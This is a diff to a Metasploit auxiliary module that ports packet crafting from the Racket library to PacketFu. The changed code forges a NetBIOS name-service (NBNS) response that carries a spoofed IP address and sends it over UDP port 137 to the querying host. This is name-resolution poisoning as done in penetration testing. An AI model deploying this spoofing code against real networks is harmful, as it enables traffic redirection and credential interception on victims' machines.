@@ -10,9 +10,10 @@
 ##
 
 require 'msf/core'
-require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Capture
 
 	def initialize
 		super(
@@ -124,19 +125,21 @@ class Metasploit3 < Msf::Auxiliary
 					"\x00\x00" + # Flags B-node, unique = whet ever that means
 					datastore['SPOOFIP'].split('.').collect(&:to_i).pack('C*')
 
-				n = Racket::Racket.new
-				n.l3 = Racket::L3::IPv4.new
-				n.l3.src_ip = Rex::Socket.source_address(rhost)
-				n.l3.dst_ip = rhost
-				n.l3.protocol = 17
-				n.l3.id = rand(0xffff)
-				n.l3.ttl = 255
-				n.l4 = Racket::L4::UDP.new
-				n.l4.src_port = 1337
-				n.l4.dst_port = 137
-				n.l4.payload  = response
-				n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
-				n.sendpacket
+				open_pcap 
+
+				p = PacketFu::UDPPacket.new
+				p.ip_saddr = Rex::Socket.source_address(rhost)
+				p.ip_daddr = rhost
+				p.ip_ttl = 255
+				p.udp_sport = 1337 
+				p.udp_dport = 137
+				p.payload = response
+				p.recalc
+
+				capture_sendto(p, rhost)
+
+				close_pcap
+
 			else
 				vprint_status("Packet received from #{rhost} with name #{nbnsq_decodedname} did not match regex")
 			end
